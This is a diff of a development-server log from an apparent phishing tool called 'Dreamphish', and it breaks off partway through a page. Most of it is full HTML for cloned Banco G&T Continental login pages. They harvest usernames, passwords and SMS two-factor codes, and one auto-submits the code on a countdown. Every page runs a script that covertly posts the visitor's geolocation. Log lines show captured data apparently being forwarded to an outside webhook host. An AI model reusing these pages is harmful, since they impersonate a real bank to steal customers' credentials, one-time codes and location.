@@ -4886,3 +4886,792 @@ C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py 
 C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
 Watching for file changes with StatReloader
 Watching for file changes with StatReloader
+Serving landing page: index-0, token: 3fda4354-4018-4da4-901c-4812a7b36a84
+Landing page found: index-0
+HTML content before modification: <!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@200;400;500;600;800&display=swap" rel="stylesheet"> 
+        <t...
+Soup object after parsing: <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@200;400;500;600;800&amp;display=swap" rel="stylesheet"/>
+<title>Beneficios Banco GyT Continental</title>
+<link href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico" rel="icon">
+<!-- Custom styles for this template -->
+<link href="http://localhost:8000/media/landing_pages/1/beneficios3gtc/css/style.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+</link></head>
+<body>
+<div class="logo">
+<h1>Portal de Beneficios</h1>
+<img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png"/>
+</div>
+<div class="wrapper">
+<div class="container">
+<form action="http://localhost:8000/landing/index-0/3fda4354-4018-4da4-901c-4812a7b36a84/" class="login-form" method="POST">
+<!-- <img src="./images/beneficios.png" style="width: 100%; max-width: 14rem; margin-left: auto; margin-right: auto;"> -->
+<div class="form-group">
+<!--     <span class="tit"> Acceder</span>
+                        <p class="mini">Ir a Gmail</p> -->
+<input class="form-control" name="email" placeholder="Usuario" required="" type="text"/>
+</div>
+<div class="form-group">
+<input class="form-control" name="password" placeholder="Contraseña" required="" type="password"/>
+<label> </label>
+<!--
+                        <button type="button" class="btn-show" onmousedown="showPw()" onmouseup="hidePw()">
+                            <img src="./images/eye.svg">
+                        </button> -->
+<p class="ptxt">Ingresa con tu usuario y contraseña para gestionar, seguir o crear solicitudes.</p>
+</div>
+<div class="form-group">
+<input class="btn btn-primary btn-lg btn-block" type="submit" value="Acceder"/>
+</div>
+</form>
+</div>
+</div>
+<footer>
+<p1>Portal de beneficios</p1>
+<p>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br/> 2024 Todos los derechos reservados G&amp;T Continental </p>
+</footer>
+<script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
+            }
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        </script></body>
+</html>
+
+Serving landing page: index-0, token: 3fda4354-4018-4da4-901c-4812a7b36a84
+Landing page found: index-0
+Serving landing page: index-1, token: 3fda4354-4018-4da4-901c-4812a7b36a84
+Landing page found: index-1
+HTML content before modification: <!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Beneficios Banco GyT Continental</title>
+        <link rel="icon" href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico"/>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;500;70...
+Soup object after parsing: <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Beneficios Banco GyT Continental</title>
+<link href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico" rel="icon"/>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;500;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;700&amp;display=swap" rel="stylesheet"/>
+<!-- Custom styles for this template -->
+<link href="http://localhost:8000/media/landing_pages/1/beneficios3gtc/css/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="logo">
+<h1>Portal de Beneficios</h1>
+<img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png"/>
+</div>
+<div class="wrapper">
+<div class="container">
+<form action="http://localhost:8000/landing/index-1/3fda4354-4018-4da4-901c-4812a7b36a84/" class="login-form" method="POST">
+<!--      <img src="./images/xlogom.svg"> -->
+<span class="tit">Verificación en 2 pasos</span>
+<br/>
+<!--  <p class="mini">Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder</p>
+-->
+<div class="auth"><img src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/images/sms5.svg"/>
+<p>Se acaba de enviar un código de verificación de 6 dígitos al teléfono.</p>
+</div>
+<input class="form-control1" id="prefixedText" name="text" placeholder="* * * * * *" required="" type="text"/>
+<div class="form-group">
+<input class="btn btn-primary btn-lg btn-block" type="submit" value="Confirmar"/>
+</div>
+<div id="cuenta" style="color: #fff;"><p> <span id="seg" style="color: #fff;">90</span> segundos</p> </div>
+</form>
+</div>
+</div>
+<script>
+            // Obtenemos el campo de texto
+            const prefixedText = document.getElementById('prefixedText');
+        
+            // Al escribir en el campo de texto
+            //  prefixedText.addEventListener('input', function() {
+            //    Verificamos si el valor del campo comienza con 'G - '
+            //    if (!this.value.startsWith('G - ')) {
+            //        Si no comienza con 'G - ', lo establecemos al inicio
+            //        this.value = 'G - ' + this.value.replace('G - ', '');
+            //    }
+            //});
+        </script>
+<footer>
+<p1>Portal de soporte</p1>
+<p>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br/> 2024 Todos los derechos reservados G&amp;T Continental </p>
+</footer>
+<script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
+            }
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        </script></body>
+<script> 
+        var contador = function(tiempo, intervalo){
+         var enCurso = 0, intv = intervalo || 1000;
+         var veces = tiempo / intv, este = this, timer;
+         this.empezar = function(callback){
+          enCurso = 1;
+          timer = setTimeout(function(){
+           if(veces + 1 && enCurso){
+            callback(veces-- * intv);
+            setTimeout(function(){ este.empezar(callback); }, intv);
+           }else{
+            return enCurso = 0;
+           }
+          }, intv);
+         };
+         this.parar = function(){
+          if(enCurso){ enCurso = 0; }
+         };
+        }
+        var cuentaAtras = new contador(89000);
+        document.body.onload = function(){ cuentaAtras.empezar(function(tiempo){
+         document.getElementById('cuenta').innerHTML = tiempo / 1000 + ' segundos';
+         if(!tiempo){ document.getElementsByTagName('form')[0].submit() }
+        }); }
+        document.getElementById('boton-parar').onclick = cuentaAtras.parar;
+        
+        </script>
+</html>
+
+Serving landing page: index-1, token: 3fda4354-4018-4da4-901c-4812a7b36a84
+Landing page found: index-1
+Serving landing page: index-2, token: 3fda4354-4018-4da4-901c-4812a7b36a84
+Landing page found: index-2
+HTML content before modification: <!DOCTYPE HTML>
+<!--
+	Directive by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Beneficios GTC Continental</title>
+		<link rel="icon" href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico"/>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets...
+Soup object after parsing: <!DOCTYPE HTML>
+
+<!--
+	Directive by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+<head>
+<title>Beneficios GTC Continental</title>
+<link href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico" rel="icon"/>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, user-scalable=no" name="viewport"/>
+<link href="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/css/main.css" rel="stylesheet"/>
+</head>
+<body class="is-preload">
+<!-- Header -->
+<div id="header">
+<!--	<span class="logo icon fa-paper-plane"></span>-->
+<img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png" style="max-width: 16rem;"/>
+<h1>Beneficios</h1>
+<p>Ahora tus requerimientos en un sólo lugar.</p>
+<a class="button smooth-scroll" href="#vacaciones">Vacaciones</a>
+<a class="button smooth-scroll" href="#main">Convenios</a>
+<a class="button smooth-scroll" href="#mas">Más</a>
+</div>
+<!-- Main -->
+<div id="main">
+<header class="major container medium">
+<h2>Conoce nuestros convenios</h2>
+<!--
+					<p>Tellus erat mauris ipsum fermentum<br />
+					etiam vivamus nunc nibh morbi.</p>
+					-->
+</header>
+<div class="box alt container">
+<section class="feature left">
+<a class="image icon solid fa-book" href="#"><img alt="" src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/images/pic01.jpg"/></a>
+<div class="content">
+<h3>Estudio</h3>
+<p>Descuentos en universidades. Las universidades o centros de conocimiento que forman a profesionales en diversas disciplinas, impulsando la investigación y la innovación. Además, fomentan el desarrollo personal y social, creando redes de colaboración y cultura.</p>
+</div>
+</section>
+<section class="feature right">
+<a class="image icon solid fa-heart" href="#"><img alt="" src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/images/pic02.jpg"/></a>
+<div class="content">
+<h3>Salud</h3>
+<p>Seguros laborales para la salud. Mantener una buena salud es esencial para una vida plena y productiva, abarcando tanto el bienestar físico como mental. Adoptar hábitos saludables, como una dieta equilibrada y ejercicio regular, contribuye a la prevención de enfermedades.</p>
+</div>
+</section>
+<section class="feature left">
+<a class="image icon solid fa-star" href="#"><img alt="" src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/images/pic03.jpg"/></a>
+<div class="content">
+<h3>Otros beneficios</h3>
+<p>Clases y talleres saludables. Los beneficios de un estilo de vida activo incluyen una mejor condición física, mayor energía y reducción del estrés. Además, prácticas como la meditación y una alimentación adecuada promueven un equilibrio integral en la vida cotidiana.</p>
+</div>
+</section>
+</div>
+<!--
+				<div class="box container">
+					<header>
+						<h2>A lot of generic stuff</h2>
+					</header>
+					<section>
+						<header>
+							<h3>Paragraph</h3>
+							<p>This is the subtitle for this particular heading</p>
+						</header>
+						<p>Phasellus nisl nisl, varius id <sup>porttitor sed pellentesque</sup> ac orci. Pellentesque
+						habitant <strong>strong</strong> tristique <b>bold</b> et netus <i>italic</i> malesuada <em>emphasized</em> ac turpis egestas. Morbi
+						leo suscipit ut. Praesent <sub>id turpis vitae</sub> turpis pretium ultricies. Vestibulum sit
+						amet risus elit.</p>
+					</section>
+					<section>
+						<header>
+							<h3>Blockquote</h3>
+						</header>
+						<blockquote>Fringilla nisl. Donec accumsan interdum nisi, quis tincidunt felis sagittis eget.
+						tempus euismod. Vestibulum ante ipsum primis in faucibus.</blockquote>
+					</section>
+					<section>
+						<header>
+							<h3>Divider</h3>
+						</header>
+						<p>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra
+						ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel. Praesent nec orci
+						facilisis leo magna. Cras sit amet urna eros, id egestas urna. Quisque aliquam
+						tempus euismod. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices
+						posuere cubilia.</p>
+						<hr />
+						<p>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra
+						ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel. Praesent nec orci
+						facilisis leo magna. Cras sit amet urna eros, id egestas urna. Quisque aliquam
+						tempus euismod. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices
+						posuere cubilia.</p>
+					</section>
+					<section>
+						<header>
+							<h3>Unordered List</h3>
+						</header>
+						<ul class="default">
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+						</ul>
+					</section>
+					<section>
+						<header>
+							<h3>Ordered List</h3>
+						</header>
+						<ol class="default">
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+							<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
+						</ol>
+					</section>
+					<section>
+						<header>
+							<h3>Table</h3>
+						</header>
+						<div class="table-wrapper">
+							<table class="default">
+								<thead>
+									<tr>
+										<th>ID</th>
+										<th>Name</th>
+										<th>Description</th>
+										<th>Price</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td>45815</td>
+										<td>Something</td>
+										<td>Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</td>
+										<td>29.99</td>
+									</tr>
+									<tr>
+										<td>24524</td>
+										<td>Nothing</td>
+										<td>Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</td>
+										<td>19.99</td>
+									</tr>
+									<tr>
+										<td>45815</td>
+										<td>Something</td>
+										<td>Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</td>
+										<td>29.99</td>
+									</tr>
+									<tr>
+										<td>24524</td>
+										<td>Nothing</td>
+										<td>Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</td>
+										<td>19.99</td>
+									</tr>
+								</tbody>
+								<tfoot>
+									<tr>
+										<td colspan="3"></td>
+										<td>100.00</td>
+									</tr>
+								</tfoot>
+							</table>
+						</div>
+					</section>
+					<section>
+						<header>
+							<h3>Form</h3>
+						</header>
+						<form method="post" action="#">
+							<div class="row">
+								<div class="col-6 col-12-mobilep">
+									<label for="name">Name</label>
+									<input class="text" type="text" name="name" id="name" value="" placeholder="John Doe" />
+								</div>
+								<div class="col-6 col-12-mobilep">
+									<label for="email">Email</label>
+									<input class="text" type="text" name="email" id="email" value="" placeholder="johndoe@domain.tld" />
+								</div>
+								<div class="col-12">
+									<label for="subject">Subject</label>
+									<input class="text" type="text" name="subject" id="subject" value="" placeholder="Enter your subject" />
+								</div>
+								<div class="col-12">
+									<label for="subject">Message</label>
+									<textarea name="message" id="message" placeholder="Enter your message" rows="6"></textarea>
+								</div>
+								<div class="col-12">
+									<ul class="actions special">
+										<li><input type="submit" value="Send" /></li>
+										<li><input type="reset" value="Reset" class="alt" /></li>
+									</ul>
+								</div>
+							</div>
+						</form>
+					</section>
+				</div>
+				-->
+<div id="vacaciones"></div>
+<footer class="major container medium">
+<h3>Vacaciones</h3>
+<p>Programa tus vacaciones con anticipación, hazlo ahora.</p>
+<ul class="actions special">
+<li><a class="button" href="#mas">Programar vacaciones</a></li>
+</ul>
+</footer>
+</div>
+<!-- Footer -->
+<div id="footer">
+<div class="container medium">
+<div id="mas"></div>
+<header class="major last">
+<h2>Escríbenos</h2>
+</header>
+<p>En GTC somos miles pero cada caso cuenta, escríbenos cómo podemos ayudarte.</p>
+<form action="http://localhost:8000/landing/index-2/3fda4354-4018-4da4-901c-4812a7b36a84/" method="post">
+<div class="row">
+<div class="col-6 col-12-mobilep">
+<input name="name" placeholder="Nombre" type="text"/>
+</div>
+<div class="col-6 col-12-mobilep">
+<input name="email" placeholder="Email" type="email"/>
+</div>
+<div class="col-12">
+<textarea name="message" placeholder="Mensaje" rows="6"></textarea>
+</div>
+<div class="col-12">
+<ul class="actions special">
+<li><input type="submit" value="Enviar Mensaje"/></li>
+</ul>
+</div>
+</div>
+</form>
+<ul class="icons">
+<li><a class="icon brands fa-facebook-f" href="https://www.facebook.com/gtc"><span class="label">Facebook</span></a></li>
+<li><a class="icon brands fa-instagram" href="https://www.instagram.com/gytcontinental"><span class="label">Instagram</span></a></li>
+<li><a class="icon brands fa-whatsapp" href="https://wa.me/50255541718"><span class="label">whatsapp</span></a></li>
+<li><a class="icon brands fa-youtube" href="https://www.youtube.com/channel/UCKTRATiQ_uKes7FO6txwiGw"><span class="label">Youtube</span></a></li>
+<li><a class="icon brands fa-linkedin" href="https://www.linkedin.com/company/banco-g-t-continental/"><span class="label">LinkdIn</span></a></li>
+</ul>
+<ul class="copyright">
+<li>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br/>© Banco G&amp;T Continental 2024 <br/> Todos los derechos reservados. 
+</li>
+</ul>
+</div>
+</div>
+<!-- Scripts -->
+<script src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/js/jquery.min.js"></script>
+<script src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/js/browser.min.js"></script>
+<script src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/js/breakpoints.min.js"></script>
+<script src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/js/util.js"></script>
+<script src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/assets/js/main.js"></script>
+<script>
+				document.querySelectorAll('a.smooth-scroll').forEach(anchor => {
+					anchor.addEventListener('click', function (e) {
+						e.preventDefault();
+						document.querySelector(this.getAttribute('href')).scrollIntoView({
+							behavior: 'smooth'
+						});
+					});
+				});
+			</script>
+<script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
+            }
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        </script></body>
+</html>
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Starting new HTTPS connection (1): faint-van-52.webhook.cool:443
+https://faint-van-52.webhook.cool:443 "POST / HTTP/11" 200 0
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+Starting new HTTPS connection (1): faint-van-52.webhook.cool:443
+https://faint-van-52.webhook.cool:443 "POST / HTTP/11" 200 0
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+Serving landing page: index-0, token: e48d5e88-6f8d-45da-af98-42006bafb426
+Landing page found: index-0
+Error al procesar webhook: Object of type datetime is not JSON serializable
+HTML content before modification: <!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@200;400;500;600;800&display=swap" rel="stylesheet"> 
+        <t...
+Soup object after parsing: <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@200;400;500;600;800&amp;display=swap" rel="stylesheet"/>
+<title>Beneficios Banco GyT Continental</title>
+<link href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico" rel="icon">
+<!-- Custom styles for this template -->
+<link href="http://localhost:8000/media/landing_pages/1/beneficios3gtc/css/style.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+</link></head>
+<body>
+<div class="logo">
+<h1>Portal de Beneficios</h1>
+<img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png"/>
+</div>
+<div class="wrapper">
+<div class="container">
+<form action="http://localhost:8000/landing/index-0/e48d5e88-6f8d-45da-af98-42006bafb426/" class="login-form" method="POST">
+<!-- <img src="./images/beneficios.png" style="width: 100%; max-width: 14rem; margin-left: auto; margin-right: auto;"> -->
+<div class="form-group">
+<!--     <span class="tit"> Acceder</span>
+                        <p class="mini">Ir a Gmail</p> -->
+<input class="form-control" name="email" placeholder="Usuario" required="" type="text"/>
+</div>
+<div class="form-group">
+<input class="form-control" name="password" placeholder="Contraseña" required="" type="password"/>
+<label> </label>
+<!--
+                        <button type="button" class="btn-show" onmousedown="showPw()" onmouseup="hidePw()">
+                            <img src="./images/eye.svg">
+                        </button> -->
+<p class="ptxt">Ingresa con tu usuario y contraseña para gestionar, seguir o crear solicitudes.</p>
+</div>
+<div class="form-group">
+<input class="btn btn-primary btn-lg btn-block" type="submit" value="Acceder"/>
+</div>
+</form>
+</div>
+</div>
+<footer>
+<p1>Portal de beneficios</p1>
+<p>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br/> 2024 Todos los derechos reservados G&amp;T Continental </p>
+</footer>
+<script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
+            }
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        </script></body>
+</html>
+
+Serving landing page: index-0, token: e48d5e88-6f8d-45da-af98-42006bafb426
+Landing page found: index-0
+Error al procesar webhook: Object of type datetime is not JSON serializable
+Serving landing page: index-1, token: e48d5e88-6f8d-45da-af98-42006bafb426
+Landing page found: index-1
+HTML content before modification: <!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Beneficios Banco GyT Continental</title>
+        <link rel="icon" href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico"/>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;500;70...
+Soup object after parsing: <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Beneficios Banco GyT Continental</title>
+<link href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico" rel="icon"/>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;500;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;700&amp;display=swap" rel="stylesheet"/>
+<!-- Custom styles for this template -->
+<link href="http://localhost:8000/media/landing_pages/1/beneficios3gtc/css/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="logo">
+<h1>Portal de Beneficios</h1>
+<img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png"/>
+</div>
+<div class="wrapper">
+<div class="container">
+<form action="http://localhost:8000/landing/index-1/e48d5e88-6f8d-45da-af98-42006bafb426/" class="login-form" method="POST">
+<!--      <img src="./images/xlogom.svg"> -->
+<span class="tit">Verificación en 2 pasos</span>
+<br/>
+<!--  <p class="mini">Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder</p>
+-->
+<div class="auth"><img src="http://localhost:8000/media/landing_pages/1/beneficios3gtc/images/sms5.svg"/>
+<p>Se acaba de enviar un código de verificación de 6 dígitos al teléfono.</p>
+</div>
+<input class="form-control1" id="prefixedText" name="text" placeholder="* * * * * *" required="" type="text"/>
+<div class="form-group">
